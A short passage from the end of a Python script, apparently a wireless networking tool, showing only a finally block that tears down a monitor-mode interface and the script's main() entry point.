    finally:
        if not args.skip_setup and not args.dry_run and args.mon_iface is None:
            cleanup_monitor_interface(mon_iface)


if __name__ == "__main__":
    main()
